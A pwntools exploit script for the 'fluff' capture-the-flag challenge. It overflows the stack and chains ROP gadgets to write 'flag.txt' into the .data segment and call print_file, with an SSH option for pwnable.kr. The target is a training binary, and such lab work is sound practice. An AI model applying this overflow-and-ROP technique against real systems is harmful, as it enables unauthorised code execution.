from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


libc_name="libfluff.so"
libc = ELF(f"./{libc_name}")
binary_name = "fluff"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e

def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            libc = ELF(f"./{libc_name}")
            # or if using ssh:
            s = ssh(user='',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x40062C", aslr=False)
        else:
            p = process(f"./{binary_name}")

    write_values = [b"f", b"l", b"a", b"g", b".", b"t",b"x",b"t"] # value we wanna write.
    write_addr = 0x601037 # .data segment

    overwrite_RBP = b"B" *8
    ret =p64(0x400616)
    payload = b"A" * ( 0x20) + overwrite_RBP +ret

    # functions
    print_file=p64(0x00400510)
    pop_rdi = p64(0x004006a3)
    pop_rcx = p64(0x0040062b)
    add_rbx_ch = p64(0x00400283)
    pop_rbx_pad_5= p64(0x40069A)

    log.success("Starting to allocate string.")
    for i, char in enumerate(write_values):
        # we want to find x, s.t. :
        # x+ 0x3ef2 = target_char
        # so we will also need to shift the bits since it's CH and not CL
        ascii_value = u8(char)

        # Construct the 64-bit value
        # Bytes 8-15 correspond to the CH part of a 64-bit register
        result = (ascii_value << 8)  # Shift ASCII value to the CH position

        noramlize_result=result-0x3ef2 
        if(noramlize_result> 0):
            char_value=p64(noramlize_result)
        else:
            char_value=p64(to_unsigned_64bit(noramlize_result))

        log.success(f"Allocated {char} at {hex(write_addr - i)}")

        payload+=pop_rcx +char_value + pop_rbx_pad_5 + p64(write_addr - i) + p64(0xdeadbeefcafebabe) *5 + add_rbx_ch


    payload +=pop_rdi +p64(write_addr) + print_file



    p.send(payload)
    p.interactive()
    # time.sleep(5000)
    

def to_unsigned_64bit(n):
    return n & 0xFFFFFFFFFFFFFFFF
main()

